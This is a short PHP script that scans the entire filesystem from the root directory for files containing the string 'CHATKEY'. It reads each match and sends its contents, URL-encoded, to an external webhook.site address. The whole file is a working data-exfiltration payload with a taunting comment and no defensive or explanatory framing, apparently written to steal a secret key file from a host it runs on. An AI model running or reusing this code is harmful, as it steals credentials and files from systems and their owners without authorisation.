<?php
function sendFileBase64($pathToFile)
{
}


function getDirContents($dir, &$results = array()) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path;
        } else if ($value != "." && $value != "..") {
            getDirContents($path, $results);
        }
    }

    return $results;
}

function searchForKey($path)
{
  if( stripos(file_get_contents($path),'CHATKEY') !== false) {
    $handle = fopen($path, "rb");
    $contents = fread($handle, filesize($path));
    fclose($handle);
    $encodedContent= urlencode($contents);
    $url = "https://webhook.site/23410df2-5255-46c0-983e-c89e81d71bd0?KEYFILE=" . $encodedContent;
    $content = file_get_contents($url);
  }
}

// BEGIN
// All your base are belong to us >=E
//$filename = "/home/pinhead/susip0rn.jpg";
//sendFileBase64($filename);

$rootDir='/';

// Get the array of all files, stored in this directory or underlying directories. 
getDirContents($rootDir,$files);

foreach ($files as $key => $value) {
  searchForKey($value);
}

throw new Exception("\n SUCCESS \n");
?>
